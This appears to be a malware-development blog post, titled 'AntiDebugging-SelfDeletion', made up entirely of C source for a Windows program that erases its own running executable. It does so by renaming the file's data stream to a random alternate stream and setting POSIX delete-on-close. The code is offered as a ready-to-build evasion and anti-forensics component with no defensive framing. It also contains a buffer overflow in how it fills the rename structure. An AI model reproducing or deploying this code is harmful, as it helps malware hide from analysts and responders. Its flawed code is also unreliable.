---
title: "AntiDebugging-SelfDeletion"
date: 2026-06-19 00:00:00 +0100
categories: [Malware, Development]
tags:
  - malware
  - development
---

# AntiDebugging-SelfDeletion


## SelfDeletion.c

```c
#include <Windows.h>
#include <stdio.h>
#include <intrin.h>

#define NEW_STREAM ":N0xshell"
#define RAND_MAX 0x7FFF

// Static -> only visible within the current translation unit.
// Uses the CPU RDRAND instruction to generate a random 32-bit value.
static unsigned int rdrand32(void) {
	UINT32 uRandomV = 0x00;

	if (_rdrand32_step(&uRandomV)) {
		return (uRandomV % (RAND_MAX + 1u));
	}

	return 0;
}

BOOL DeleteSelf(void) {

	WCHAR wcNewStream[7] = L":%x%x\x00";
	BOOL bState = FALSE;

	// Buffer that receives the fully qualified path of the current executable.
	WCHAR wcFileName[MAX_PATH * 2] = { 0x00 };

	FILE_RENAME_INFO RenameInfo = { 0 };
	RenameInfo.FileNameLength = sizeof(wcNewStream);
	RenameInfo.ReplaceIfExists = FALSE;
	RenameInfo.RootDirectory = NULL;

	FILE_DISPOSITION_INFO_EX FileDisposalInfoEx = { 0 };

	// Handle to the current executable.
	HANDLE hLocalImgFile = INVALID_HANDLE_VALUE;

	// Retrieve the fully qualified path of the current executable.
	if (GetModuleFileNameW(NULL, wcFileName, MAX_PATH * 2) == 0x00) {
		printf("[!] GetModuleFileNameW Failed: %d \n", GetLastError());
		goto _End;
	}

	// Generate a random alternate data stream name.
	swprintf(RenameInfo.FileName, MAX_PATH, wcNewStream, rdrand32(), rdrand32());

	// Open the current executable with delete access.
	if ((hLocalImgFile = CreateFileW(wcFileName, DELETE | SYNCHRONIZE, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, NULL, NULL)) == INVALID_HANDLE_VALUE) {
		printf("[!] CreateFileW %d Failed: %d \n", __LINE__, GetLastError());
		return bState;
	}

	// Rename the file's alternate data stream.
	if (!SetFileInformationByHandle(hLocalImgFile, FileRenameInfo, &RenameInfo, sizeof(RenameInfo))) {
		printf("[!] SetFileInformationByHandle %d Failed: %lu\n", __LINE__, GetLastError());
		goto _End;
	}

	CloseHandle(hLocalImgFile);

	// Reopen the executable before marking it for deletion.
	if ((hLocalImgFile = CreateFileW(wcFileName, DELETE | SYNCHRONIZE, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, NULL, NULL)) == INVALID_HANDLE_VALUE) {
		printf("[!] CreateFileW %d Failed: %d \n", __LINE__, GetLastError());
		goto _End;
	}

	// Configure POSIX-style delete-on-close semantics.
	FileDisposalInfoEx.Flags = FILE_DISPOSITION_FLAG_DELETE | FILE_DISPOSITION_FLAG_POSIX_SEMANTICS;

	// Mark the file for deletion.
	if (!SetFileInformationByHandle(hLocalImgFile, FileDispositionInfoEx, &FileDisposalInfoEx, sizeof(FILE_DISPOSITION_INFO_EX))) {
		printf("[!] SetFileInformationByHandle %d Failed: %d \n", __LINE__, GetLastError());
		goto _End;
	}

	bState = TRUE;

_End:

	// Ensure any open handle is released.
	if (hLocalImgFile != INVALID_HANDLE_VALUE)
		CloseHandle(hLocalImgFile);

	return bState;
}

int main(int argc, char* argv[]) {

	if (!DeleteSelf()) {
		return -1;
	}

	printf("[+] %s Should Be Deleted \n", argv[0]);

	printf("[!] Press <Enter> To Quit \n");
	getchar();

	return 0;

}
```

